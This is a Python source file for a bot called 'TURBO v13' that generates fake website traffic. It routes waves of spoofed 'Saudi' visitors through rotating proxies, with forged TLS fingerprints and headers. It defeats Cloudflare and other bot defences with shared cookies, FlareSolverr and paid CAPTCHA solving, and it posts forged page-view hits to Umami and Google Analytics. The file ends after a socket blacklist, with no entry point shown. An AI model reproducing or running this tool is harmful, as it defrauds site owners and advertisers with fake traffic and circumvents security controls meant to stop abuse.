#!/usr/bin/env python3
"""
TURBO v13 - HYBRID UNIVERSAL TRAFFIC ENGINE
=============================================
Bypasses ALL protection types with intelligent mode selection:
  Mode A: Socket.IO  → Direct WebSocket connection (fastest)
  Mode B: Browser    → Real Chrome + Cookie Harvester (strongest, persistent visitors)
  Mode C: Cloudflare → TLS spoofing + shared cookies + CAPTCHA solving
  Mode D: Plain HTTP → Direct requests with Saudi proxy (fast)

HYBRID SYSTEM:
  - Strong protections (DataDome, Kasada, PerimeterX, Shape) → Browser mode
  - Medium protections (Cloudflare, Akamai, Imperva) → curl_cffi with browser fallback
  - No/weak protection → curl_cffi direct (high volume)

Browser Mode (NEW):
  - Cookie Harvester: 8 real Chrome contexts solving challenges in background
  - Cookie Pool: Thread-safe pool of valid cookies bound to proxy IPs
  - Persistent Visitors: Enter site and STAY browsing until time expires
  - Accumulation: Each wave adds visitors, nobody leaves = numbers grow
  - Human Behavior: Scrolling, clicking links, reading pages
  - All visitors appear as real Saudi users in admin panel

Each visitor:
  - Real browser TLS fingerprint (JA3/JA4 matches real browser)
  - Unique Saudi IP (real proxy)
  - Unique fingerprint (OS, browser, device)
  - Browser mode: STAYS on site until time expires (persistent)
  - Other modes: Stays ~30s then leaves, replaced by new wave
"""
import threading, time, random, string, sys, json, os, re
import requests
from urllib.parse import urlparse

# Try to import curl_cffi for TLS fingerprint spoofing
try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# ============ ANALYTICS HIT (NEW - does NOT change existing code) ============
def detect_analytics(html_content):
    """Auto-detect analytics type and tracking ID from HTML."""
    analytics = {"type": None, "id": None, "endpoint": None, "hostname": None}
    if not html_content:
        return analytics
    
    # Umami Analytics
    umami_src = re.search(r'src=["\']([^"\']*umami[^"\']*)["\']', html_content)
    umami_id = re.search(r'data-website-id=["\']([^"\']+)["\']', html_content)
    if umami_src and umami_id:
        endpoint = umami_src.group(1)
        # Get the base domain from the script URL
        # e.g. https://manus-analytics.com/umami -> https://manus-analytics.com
        # e.g. https://example.com/umami.js -> https://example.com
        from urllib.parse import urlparse as _up
        ep_parsed = _up(endpoint if endpoint.startswith('http') else 'https://' + endpoint.lstrip('/'))
        endpoint_base = f"{ep_parsed.scheme}://{ep_parsed.netloc}"
        analytics["type"] = "umami"
        analytics["id"] = umami_id.group(1)
        analytics["endpoint"] = endpoint_base + "/api/send"
        return analytics
    
    # Google Analytics 4 (GA4)
    ga4_match = re.search(r'["\']G-([A-Z0-9]+)["\']', html_content)
    if ga4_match:
        analytics["type"] = "ga4"
        analytics["id"] = "G-" + ga4_match.group(1)
        analytics["endpoint"] = "https://www.google-analytics.com/g/collect"
        return analytics
    
    # Google Tag Manager (GTM) - extract GA4 ID from GTM container
    gtm_match = re.search(r'googletagmanager\.com/gtag/js\?id=(G-[A-Z0-9]+)', html_content)
    if not gtm_match:
        gtm_match = re.search(r'googletagmanager\.com/gtag/js\?id=(GTM-[A-Z0-9]+)', html_content)
    if gtm_match:
        tid = gtm_match.group(1)
        if tid.startswith('G-'):
            analytics["type"] = "ga4"
            analytics["id"] = tid
            analytics["endpoint"] = "https://www.google-analytics.com/g/collect"
            return analytics
        elif tid.startswith('GTM-'):
            # GTM container - send hit to GA4 endpoint using GTM ID as fallback
            analytics["type"] = "gtm"
            analytics["id"] = tid
            analytics["endpoint"] = "https://www.google-analytics.com/g/collect"
            return analytics
    
    # Universal Analytics (UA)
    ua_match = re.search(r'["\']UA-([0-9]+-[0-9]+)["\']', html_content)
    if ua_match:
        analytics["type"] = "ua"
        analytics["id"] = "UA-" + ua_match.group(1)
        analytics["endpoint"] = "https://www.google-analytics.com/collect"
        return analytics
    
    return analytics


def send_analytics_hit(analytics_info, page_url, hostname, proxy=None, user_agent=None):
    """Send analytics hit so visitor appears in admin panel. Silent fail - never breaks visits."""
    try:
        if not analytics_info or not analytics_info.get("type"):
            return
        
        atype = analytics_info["type"]
        aid = analytics_info["id"]
        endpoint = analytics_info["endpoint"]
        
        if not endpoint:
            return
        
        # Random screen sizes and languages for variety
        screens = ["1920x1080", "1366x768", "1536x864", "1440x900", "1280x720", "2560x1440"]
        langs = ["ar-SA", "ar", "ar-AE", "ar-EG", "en-US"]
        
        headers = {
            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
        }
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        if atype == "umami":
            payload = {
                "payload": {
                    "hostname": hostname,
                    "language": random.choice(langs),
                    "referrer": random.choice(["", "https://www.google.com/", "https://www.google.com.sa/", ""]),
                    "screen": random.choice(screens),
                    "title": hostname,
                    "url": page_url if page_url.startswith("/") else "/" + page_url.split("/", 3)[-1] if "/" in page_url[8:] else "/",
                    "website": aid,
                },
                "type": "event"
            }
            requests.post(endpoint, json=payload, headers=headers, proxies=proxies, timeout=5)
        
        elif atype == "ga4":
            # GA4 /g/collect endpoint - mimics real browser gtag.js hit
            cid = ''.join(random.choices(string.digits, k=10)) + '.' + str(int(time.time()))
            sid = ''.join(random.choices(string.digits, k=10))
            page_path = page_url if page_url.startswith('/') else '/'
            full_url = f"https://{hostname}{page_path}"
            referrers = ["", "https://www.google.com/", "https://www.google.com.sa/", "https://www.google.ae/", ""]
            params = {
                "v": "2",
                "tid": aid,
                "cid": cid,
                "sid": sid,
                "_p": ''.join(random.choices(string.digits, k=9)),
                "dl": full_url,
                "dt": hostname,
                "dr": random.choice(referrers),
                "ul": random.choice(langs),
                "sr": random.choice(screens),
                "en": "page_view",
                "_s": "1",
                "seg": "1",
                "_ss": "1",
                "_nsi": "1",
                "_fv": "1",
                "_ee": "1",
                "tfd": str(random.randint(50, 500)),
            }
            ga_headers = {
                "User-Agent": headers["User-Agent"],
                "Origin": f"https://{hostname}",
                "Referer": full_url,
            }
            requests.post(endpoint, params=params, headers=ga_headers, proxies=proxies, timeout=5)
        
        elif atype == "gtm":
            # GTM - send same format as GA4 hit
            cid = ''.join(random.choices(string.digits, k=10)) + '.' + str(int(time.time()))
            sid = ''.join(random.choices(string.digits, k=10))
            page_path = page_url if page_url.startswith('/') else '/'
            full_url = f"https://{hostname}{page_path}"
            referrers = ["", "https://www.google.com/", "https://www.google.com.sa/", "https://www.google.ae/", ""]
            params = {
                "v": "2", "tid": aid, "cid": cid, "sid": sid,
                "_p": ''.join(random.choices(string.digits, k=9)),
                "dl": full_url, "dt": hostname, "dr": random.choice(referrers),
                "ul": random.choice(langs), "sr": random.choice(screens),
                "en": "page_view", "_s": "1", "seg": "1", "_ss": "1",
                "_nsi": "1", "_fv": "1", "_ee": "1",
                "tfd": str(random.randint(50, 500)),
            }
            ga_headers = {
                "User-Agent": headers["User-Agent"],
                "Origin": f"https://{hostname}",
                "Referer": full_url,
            }
            requests.post(endpoint, params=params, headers=ga_headers, proxies=proxies, timeout=5)
        
        elif atype == "ua":
            cid = ''.join(random.choices(string.digits, k=10)) + '.' + str(int(time.time()))
            params = {
                "v": "1", "tid": aid, "cid": cid, "t": "pageview",
                "dl": f"https://{hostname}{page_url if page_url.startswith('/') else '/'}",
                "dt": hostname, "ul": random.choice(langs), "sr": random.choice(screens),
            }
            requests.post(endpoint, data=params, headers={"User-Agent": headers["User-Agent"]}, proxies=proxies, timeout=5)
    except:
        pass  # Silent fail - analytics hit should NEVER break the visit


# ============ CONFIG ============
STATUS_FILE = "/root/visit_status.json"
WAVE_SIZE = int(os.environ.get("WAVE_SIZE", "200"))
WAVE_INTERVAL = int(os.environ.get("WAVE_INTERVAL", "30"))
STAY_TIME = int(os.environ.get("STAY_TIME", "35"))

PROXY_USER = os.environ.get("PROXY_USER", "")
PROXY_PASS = os.environ.get("PROXY_PASS", "")
PROXY_HOST = os.environ.get("PROXY_HOST", "proxy.packetstream.io")
PROXY_PORT = os.environ.get("PROXY_PORT", "31112")

# CAPTCHA solver API keys (2Captcha or CapSolver)
CAPTCHA_API_KEY = os.environ.get("CAPTCHA_API_KEY", "")
CAPTCHA_SERVICE = os.environ.get("CAPTCHA_SERVICE", "2captcha")  # "2captcha" or "capsolver"

# ============ BROWSER PROFILES ============
BROWSER_PROFILES = [
    {"impersonate": "chrome131", "os": "Windows", "device": "Desktop", "browser": "Chrome",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
    {"impersonate": "chrome120", "os": "macOS", "device": "Desktop", "browser": "Chrome",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
    {"impersonate": "chrome116", "os": "Windows", "device": "Desktop", "browser": "Chrome",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"},
    {"impersonate": "chrome110", "os": "Windows", "device": "Desktop", "browser": "Chrome",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"},
    {"impersonate": "safari18_0", "os": "macOS", "device": "Desktop", "browser": "Safari",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"},
    {"impersonate": "safari17_0", "os": "macOS", "device": "Desktop", "browser": "Safari",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"},
    {"impersonate": "safari15_5", "os": "macOS", "device": "Desktop", "browser": "Safari",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"},
    {"impersonate": "edge", "os": "Windows", "device": "Desktop", "browser": "Edge",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"},
    {"impersonate": "chrome", "os": "iOS", "device": "Mobile", "browser": "Safari",
     "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1"},
    {"impersonate": "chrome", "os": "Android", "device": "Mobile", "browser": "Chrome",
     "ua": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"},
]

SA_IP_PREFIXES = [
    "185.70","185.71","185.73","37.224","37.225","37.217",
    "51.235","51.36","82.167","82.197","95.186","95.187",
    "178.87","178.88","144.86","188.50","188.51","188.52",
    "46.151","5.1","5.3","62.149","77.30","89.33",
    "109.68","176.224","213.6","213.7",
]
SA_CITIES = ["Riyadh","Jeddah","Mecca","Medina","Dammam","Khobar","Tabuk","Abha","Taif","Hail","Buraidah","Najran","Jazan","Yanbu",""]

# ============ STATS ============
stats = {
    "success":0,"failed":0,"start_time":0,"target":0,
    "active_visitors":0,"waves_done":0,"total_waves":0,
    "duration_min":0,"mode":"detecting","unique_ips":0,"peak_active":0,
    "error_reasons":{},
    "verified_visitors":0,"blocked_visitors":0,"peak_verified":0,
}
lock = threading.Lock()
stop_event = threading.Event()

# ============ CLOUDFLARE COOKIE CACHE ============
cf_cookie_cache = {
    "cookies": {},
    "user_agent": "",
    "timestamp": 0,
    "valid": False,
    "mode": "shared",
    "fail_count": 0,
    "lock": threading.Lock(),
}

# ============ HELPERS ============
def gen_ip():
    p = random.choice(SA_IP_PREFIXES).split(".")
    while len(p) < 4: p.append(str(random.randint(1,254)))
    return ".".join(p)

def gen_api_key():
    return "api_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))

def gen_fingerprint():
    profile = random.choice(BROWSER_PROFILES)
    fp = {
        "os": profile["os"],
        "device": profile["device"],
        "browser": profile["browser"],
        "ip": gen_ip(),
        "country": "SA",
        "city": random.choice(SA_CITIES),
        "apiKey": gen_api_key(),
    }
    return fp, profile

def get_proxy_url():
    if PROXY_USER and PROXY_PASS:
        sess = "".join(random.choices(string.ascii_lowercase+string.digits, k=8))
        # Don't add _country-SaudiArabia if already in password
        pw = PROXY_PASS
        if '_country-' not in pw:
            pw = pw + '_country-SaudiArabia'
        return f"http://{PROXY_USER}:{pw}_session-{sess}@{PROXY_HOST}:{PROXY_PORT}"
    return None

def get_browser_headers(profile, referer=None):
    """Generate realistic browser headers matching the TLS profile."""
    headers = {
        "User-Agent": profile["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none" if not referer else "same-origin",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua-platform": f'"{profile["os"]}"',
    }
    if "Chrome" in profile["browser"] or "Edge" in profile["browser"]:
        headers["sec-ch-ua"] = '"Chromium";v="131", "Not_A Brand";v="24"'
        headers["sec-ch-ua-mobile"] = "?1" if profile["device"] == "Mobile" else "?0"
    if referer:
        headers["Referer"] = referer
    return headers

def smart_request(url, profile, proxy=None, cookies=None, timeout=15):
    """
    Make HTTP request with real browser TLS fingerprint.
    Uses curl_cffi when available, falls back to requests.
    """
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = get_browser_headers(profile)
    
    if HAS_CFFI:
        try:
            r = cffi_requests.get(
                url,
                impersonate=profile["impersonate"],
                headers=headers,
                proxies=proxies,
                cookies=cookies,
                timeout=timeout,
                allow_redirects=True,
            )
            return r
        except Exception:
            pass
    
    # Fallback to regular requests
    r = requests.get(url, headers=headers, proxies=proxies, cookies=cookies,
                    timeout=timeout, allow_redirects=True)
    return r

def write_status():
    try:
        e = time.time() - stats["start_time"] if stats["start_time"] else 0
        r = stats["success"] / e * 60 if e > 0 else 0
        p = min((stats["waves_done"]/stats["total_waves"]*100) if stats["total_waves"]>0 else 0, 100)
        with open(STATUS_FILE,"w") as f:
            json.dump({
                "status":"finished" if stats["waves_done"]>=stats["total_waves"] else "running",
                "visits":stats["success"],"errors":stats["failed"],
                "target":stats["target"],"progress":round(p,1),
                "elapsed":round(e,1),"rate":round(r,1),
                "timestamp":int(time.time()),"mode":stats["mode"],
                "active_visitors":stats["active_visitors"],
                "peak_active":stats["peak_active"],
                "waves_done":stats["waves_done"],
                "total_waves":stats["total_waves"],
                "duration_min":stats["duration_min"],
                "unique_ips":stats["unique_ips"],
                "verified_visitors":stats["verified_visitors"],
                "blocked_visitors":stats["blocked_visitors"],
                "peak_verified":stats["peak_verified"],
                "browser_mode": "browser" in stats.get("mode", ""),
            },f)
    except: pass

def log_progress(fail_reason=""):
    with lock:
        if fail_reason:
            stats["error_reasons"][fail_reason] = stats["error_reasons"].get(fail_reason, 0) + 1
        total = stats["success"]+stats["failed"]
        if total % 10 == 0 or total <= 5:
            e = time.time()-stats["start_time"]
            r = stats["success"]/e*60 if e>0 else 0
            write_status()
            err_str = " | ".join(f"{k}:{v}" for k,v in sorted(stats["error_reasons"].items(), key=lambda x:-x[1])[:5])
            print(f"  [W{stats['waves_done']}/{stats['total_waves']}] "
                  f"\u2705{stats['success']} \u274c{stats['failed']} | "
                  f"{r:.0f}/min | \U0001f465{stats['active_visitors']} active "
                  f"(\u2714\ufe0f{stats['verified_visitors']} verified) "
                  f"(peak:{stats['peak_active']}) | "
                  f"\U0001f6ab{stats['blocked_visitors']} blocked | "
                  f"\U0001f30d{stats['unique_ips']} IPs | mode:{stats['mode']}"
                  f"{' | ERR: ' + err_str if err_str else ''}", flush=True)


# ============ CAPTCHA SOLVER ============
def solve_captcha(site_url, site_key, captcha_type="turnstile"):
    """
    Solve CAPTCHA using 2Captcha or CapSolver API.
    Supports: Cloudflare Turnstile, reCAPTCHA v2/v3, hCaptcha
    Returns: captcha token string or None
    """
    if not CAPTCHA_API_KEY:
        return None
    
    try:
        if CAPTCHA_SERVICE == "2captcha":
            return solve_2captcha(site_url, site_key, captcha_type)
        elif CAPTCHA_SERVICE == "capsolver":
            return solve_capsolver(site_url, site_key, captcha_type)
    except Exception as e:
        print(f"  ⚠️ CAPTCHA solve error: {e}", flush=True)
    return None


def solve_2captcha(site_url, site_key, captcha_type):
    """Solve via 2Captcha API."""
    base = "https://2captcha.com"
    
    # Map captcha types to 2captcha methods
    type_map = {
        "turnstile": {"method": "turnstile", "key_param": "sitekey"},
        "recaptcha_v2": {"method": "userrecaptcha", "key_param": "googlekey"},
        "recaptcha_v3": {"method": "userrecaptcha", "key_param": "googlekey"},
        "hcaptcha": {"method": "hcaptcha", "key_param": "sitekey"},
    }
    
    config = type_map.get(captcha_type, type_map["turnstile"])
    
    # Submit task
    payload = {
        "key": CAPTCHA_API_KEY,
        "method": config["method"],
        config["key_param"]: site_key,
        "pageurl": site_url,
        "json": 1,
    }
    if captcha_type == "recaptcha_v3":
        payload["version"] = "v3"
        payload["action"] = "verify"
        payload["min_score"] = 0.7
    
    r = requests.post(f"{base}/in.php", data=payload, timeout=30)
    data = r.json()
    
    if data.get("status") != 1:
        print(f"  ⚠️ 2Captcha submit error: {data}", flush=True)
        return None
    
    task_id = data["request"]
    print(f"  🔑 CAPTCHA task submitted: {task_id}", flush=True)
    
    # Poll for result (max 120 seconds)
    for _ in range(24):
        time.sleep(5)
        r = requests.get(f"{base}/res.php", params={
            "key": CAPTCHA_API_KEY, "action": "get", "id": task_id, "json": 1
        }, timeout=15)
        data = r.json()
        
        if data.get("status") == 1:
            print(f"  ✅ CAPTCHA solved!", flush=True)
            return data["request"]
        elif data.get("request") != "CAPCHA_NOT_READY":
            print(f"  ❌ CAPTCHA error: {data}", flush=True)
            return None
    
    return None


def solve_capsolver(site_url, site_key, captcha_type):
    """Solve via CapSolver API."""
    base = "https://api.capsolver.com"
    
    type_map = {
        "turnstile": "AntiTurnstileTaskProxyLess",
        "recaptcha_v2": "ReCaptchaV2TaskProxyLess",
        "recaptcha_v3": "ReCaptchaV3TaskProxyLess",
        "hcaptcha": "HCaptchaTaskProxyLess",
    }
    
    task_type = type_map.get(captcha_type, type_map["turnstile"])
    
    # Create task
    payload = {
        "clientKey": CAPTCHA_API_KEY,
        "task": {
            "type": task_type,
            "websiteURL": site_url,
            "websiteKey": site_key,
        }
    }
    
    r = requests.post(f"{base}/createTask", json=payload, timeout=30)
    data = r.json()
    
    if data.get("errorId", 1) != 0:
        print(f"  ⚠️ CapSolver error: {data}", flush=True)
        return None
    
    task_id = data["taskId"]
    print(f"  🔑 CAPTCHA task submitted: {task_id}", flush=True)
    
    # Poll for result
    for _ in range(24):
        time.sleep(5)
        r = requests.post(f"{base}/getTaskResult", json={
            "clientKey": CAPTCHA_API_KEY, "taskId": task_id
        }, timeout=15)
        data = r.json()
        
        if data.get("status") == "ready":
            token = data.get("solution", {}).get("token", "")
            if token:
                print(f"  ✅ CAPTCHA solved!", flush=True)
                return token
        elif data.get("status") == "failed":
            print(f"  ❌ CAPTCHA failed: {data}", flush=True)
            return None
    
    return None


def detect_captcha(html):
    """Detect CAPTCHA type and site key from HTML."""
    result = {"type": None, "site_key": None}
    
    # Cloudflare Turnstile
    if "challenges.cloudflare.com/turnstile" in html or "cf-turnstile" in html:
        result["type"] = "turnstile"
        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
        if m:
            result["site_key"] = m.group(1)
        else:
            m = re.search(r'sitekey["\s:]+["\']([^"\']+)["\']', html)
            if m:
                result["site_key"] = m.group(1)
    
    # reCAPTCHA
    elif "google.com/recaptcha" in html or "g-recaptcha" in html:
        result["type"] = "recaptcha_v2"
        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
        if m:
            result["site_key"] = m.group(1)
        if "recaptcha/api.js?render=" in html:
            result["type"] = "recaptcha_v3"
            m = re.search(r'render=([^&"\']+)', html)
            if m:
                result["site_key"] = m.group(1)
    
    # hCaptcha
    elif "hcaptcha.com" in html or "h-captcha" in html:
        result["type"] = "hcaptcha"
        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
        if m:
            result["site_key"] = m.group(1)
    
    return result


# ============ ADVANCED BLOCK/SUCCESS DETECTION ============
# Block indicators - if ANY of these are in the response, it's NOT real content
BLOCK_INDICATORS = [
    "just a moment", "checking your browser", "cf-browser-verification",
    "cf-challenge-running", "enable javascript and cookies to continue",
    "please wait while we verify", "one more step",
    "please complete the security check", "attention required",
    "access denied", "you have been blocked", "error 1020",
    "sorry, you have been blocked", "performance & security by cloudflare",
    "ddos protection by", "please turn javascript on",
    "pardon our interruption", "press & hold", "verifying you are human",
    "geo.captcha-delivery.com", "request blocked",
    "the requested url was rejected", "reference #18",
    "cf-chl-widget", "cf-spinner-please-wait",
]

def is_cf_blocked(response):
    """Legacy wrapper - checks if response is a challenge/block page.
    Now uses the advanced verification system."""
    try:
        success, reason = verify_visit_response(response)
        return not success
    except:
        return False

def verify_visit_response(response):
    """
    ADVANCED VERIFICATION: Check if a visitor's request actually reached real content.
    Returns: (bool success, str reason)
    
    This is the KEY improvement - instead of just checking status code,
    we verify the actual content to know if the visit was real.
    """
    try:
        text = response.text
        text_lower = text.lower()
        status = response.status_code
        
        # === DEFINITE BLOCKS ===
        # Status code blocks
        if status in [403, 503, 429]:
            return False, f"status_{status}"
        
        # Content-based blocks (check ALL block indicators)
        for indicator in BLOCK_INDICATORS:
            if indicator in text_lower:
                return False, f"blocked:{indicator[:30]}"
        
        # Small page with challenge-platform = blocked
        if 'challenge-platform' in text_lower and len(text) < 5000:
            return False, "cf_challenge_page"
        
        # === SUCCESS VERIFICATION ===
        success_signals = 0
        
        # 1. Real title check (not a challenge title)
        if '<title>' in text_lower and '</title>' in text_lower:
            title_match = re.search(r'<title>([^<]+)</title>', text, re.IGNORECASE)
            if title_match:
                title = title_match.group(1).strip().lower()
                challenge_titles = ["just a moment", "attention required", "access denied",
                                    "cloudflare", "please wait", "ddos", "security check",
                                    "blocked", "error", "403", "503", "captcha"]
                if not any(ct in title for ct in challenge_titles):
                    success_signals += 2  # Real title = strong signal
                else:
                    return False, f"challenge_title:{title[:30]}"
        
        # 2. HTML structure signals
        if '<nav' in text_lower or '<header' in text_lower:
            success_signals += 1
        if '<footer' in text_lower:
            success_signals += 1
        if '<main' in text_lower or '<article' in text_lower:
            success_signals += 1
        
        # 3. Content size (challenge pages are usually small)
        if len(text) > 10000:
            success_signals += 1
        elif len(text) > 5000:
            success_signals += 0.5
        
        # 4. Multiple links/images = real page
        link_count = text_lower.count('<a ')
        if link_count > 5:
            success_signals += 1
        img_count = text_lower.count('<img')
        if img_count > 2:
            success_signals += 0.5
        
        # 5. SPA shell (React/Next.js/Vue) - counts as success
        if '<div id="root"' in text_lower or '<div id="__next"' in text_lower or '<div id="app"' in text_lower:
            success_signals += 1
        
        # === VERDICT ===
        if status == 200 and success_signals >= 3:
            return True, "verified_real_content"
        elif status == 200 and success_signals >= 1 and len(text) > 2000:
            return True, "likely_real_content"
        elif status in [200, 301, 302] and len(text) > 1500 and success_signals >= 1:
            return True, "probable_content"
        elif status == 200 and len(text) < 1000:
            return False, "suspicious_small_page"
        else:
            return False, f"uncertain_s{success_signals}_sz{len(text)}"
    
    except Exception as e:
        return False, f"error:{type(e).__name__}"


# ============ CLOUDFLARE COOKIE SOLVER ============
def solve_cloudflare_once(url, proxy=None):
    """Use FlareSolverr OR curl_cffi + CAPTCHA to solve Cloudflare."""
    
    # Method 1: Try curl_cffi with TLS spoofing first (fastest)
    if HAS_CFFI:
        profile = random.choice(BROWSER_PROFILES)
        try:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            headers = get_browser_headers(profile)
            r = cffi_requests.get(url, impersonate=profile["impersonate"],
                                 headers=headers, proxies=proxies, timeout=20, verify=False)
            
            if r.status_code == 200 and not is_cf_blocked(r):
                # curl_cffi bypassed Cloudflare directly!
                cookies = dict(r.cookies)
                print(f"  ⚡ curl_cffi bypassed Cloudflare directly! ({len(cookies)} cookies)", flush=True)
                return {"cookies": cookies, "user_agent": profile["ua"], 
                        "html": r.text, "method": "cffi"}
            
            # Check if there's a CAPTCHA we can solve
            if r.status_code in [403, 503]:
                captcha = detect_captcha(r.text)
                if captcha["type"] and captcha["site_key"] and CAPTCHA_API_KEY:
                    print(f"  🔑 Found {captcha['type']} CAPTCHA, solving...", flush=True)
                    token = solve_captcha(url, captcha["site_key"], captcha["type"])
                    if token:
                        # Submit CAPTCHA token
                        cookies = dict(r.cookies)
                        cookies["cf_clearance"] = token
                        # Retry with token
                        r2 = cffi_requests.get(url, impersonate=profile["impersonate"],
                                              headers=headers, proxies=proxies,
                                              cookies=cookies, timeout=20, verify=False)
                        if r2.status_code == 200:
                            cookies.update(dict(r2.cookies))
                            return {"cookies": cookies, "user_agent": profile["ua"],
                                    "html": r2.text, "method": "cffi+captcha"}
        except Exception as e:
            print(f"  ⚠️ curl_cffi attempt: {e}", flush=True)
    
    # Method 2: FlareSolverr (reliable fallback)
    for port in range(8191, 8211):
        try:
            payload = {"cmd": "request.get", "url": url, "maxTimeout": 45000}
            if proxy:
                payload["proxy"] = {"url": proxy}
            
            r = requests.post(f"http://localhost:{port}/v1", json=payload, timeout=50)
            data = r.json()
            
            if data.get("status") == "ok":
                solution = data.get("solution", {})
                cookies_list = solution.get("cookies", [])
                ua = solution.get("userAgent", "")
                html = solution.get("response", "")
                cookies = {c["name"]: c["value"] for c in cookies_list}
                
                if cookies:
                    print(f"  🍪 FlareSolverr solved! ({len(cookies)} cookies, port {port})", flush=True)
                    return {"cookies": cookies, "user_agent": ua, "html": html, "method": "flaresolverr"}
        except:
            continue
    
    return None


def refresh_cf_cookies(url):
    """Background thread: refresh Cloudflare cookies every 10 minutes."""
    while not stop_event.is_set():
        for _ in range(600):
            if stop_event.is_set(): return
            time.sleep(1)
        
        print(f"\n🔄 Refreshing Cloudflare cookies...", flush=True)
        proxy = get_proxy_url()
        result = solve_cloudflare_once(url, proxy=proxy)
        if result:
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["cookies"] = result["cookies"]
                cf_cookie_cache["user_agent"] = result["user_agent"]
                cf_cookie_cache["timestamp"] = time.time()
                cf_cookie_cache["valid"] = True
            print(f"  ✅ Cookies refreshed ({result['method']})", flush=True)


def init_cf_cookies(url):
    """Initialize Cloudflare cookies at startup."""
    print(f"\n🔐 Solving Cloudflare challenge...", flush=True)
    
    proxy = get_proxy_url()
    result = solve_cloudflare_once(url, proxy=proxy)
    
    if result:
        with cf_cookie_cache["lock"]:
            cf_cookie_cache["cookies"] = result["cookies"]
            cf_cookie_cache["user_agent"] = result["user_agent"]
            cf_cookie_cache["timestamp"] = time.time()
            cf_cookie_cache["valid"] = True
            cf_cookie_cache["mode"] = "shared"
        
        # Test shared cookies with different proxy
        print(f"  🧪 Testing shared cookies with different IP...", flush=True)
        test_proxy = get_proxy_url()
        test_ok = test_cf_cookies(url, result["cookies"], result["user_agent"], test_proxy)
        
        if test_ok:
            print(f"  ✅ Shared cookies work! ⚡ FAST mode (~200 active)", flush=True)
            t = threading.Thread(target=refresh_cf_cookies, args=(url,), daemon=True)
            t.start()
            return True
        else:
            print(f"  ⚠️ Shared cookies IP-bound, switching to per-proxy", flush=True)
            with cf_cookie_cache["lock"]:
                cf_cookie_cache["mode"] = "per_proxy"
            return True
    
    print(f"  ❌ Could not solve Cloudflare", flush=True)
    with cf_cookie_cache["lock"]:
        cf_cookie_cache["mode"] = "per_proxy"
        cf_cookie_cache["valid"] = False
    return False


def test_cf_cookies(url, cookies, user_agent, proxy=None):
    """Test if cookies work with a different proxy."""
    try:
        profile = random.choice(BROWSER_PROFILES)
        if HAS_CFFI:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            r = cffi_requests.get(url, impersonate=profile["impersonate"],
                                 cookies=cookies, proxies=proxies, timeout=15)
            return r.status_code == 200 and not is_cf_blocked(r)
        else:
            proxies = {"http": proxy, "https": proxy} if proxy else None
            headers = {"User-Agent": user_agent}
            r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=15)
            return r.status_code == 200 and not is_cf_blocked(r)
    except:
        return False


# ============ SOCKET.IO BLACKLIST ============
# Blacklist of domains that should NEVER be treated as Socket.IO endpoints
SOCKET_BLACKLIST = [
    'datadome', 'data-flow-apis', 'dataflow', 'captcha-delivery',
    'cloudflare', 'cloudflareinsights', 'challenges.cloudflare',
    'akamai', 'edgekey', 'edgesuite', 'akadns',
    'imperva', 'incapsula',
    'perimeterx', 'px-cdn', 'px-cloud', 'pxchk', 'human.com',
    'kasada', 'shapesecurity',
    'google-analytics', 'googletagmanager', 'googleapis', 'gstatic',
    'facebook.com', 'fbcdn', 'connect.facebook',
    'doubleclick', 'googlesyndication', 'adservice',
    'hotjar', 'clarity.ms', 'segment.io', 'mixpanel', 'amplitude',
    'sentry.io', 'newrelic', 'datadog', 'bugsnag',
    'recaptcha', 'hcaptcha', 'turnstile',
    'cdn.jsdelivr', 'cdnjs.cloudflare', 'unpkg.com',
    'nexaflow', 'nf-api',
]

def is_blacklisted_socket_url(url):
    """Check if URL belongs to a protection/analytics service (not a real Socket.IO server)."""
    lower = url.lower()
    return any(bl in lower for bl in SOCKET_BLACKLIST)


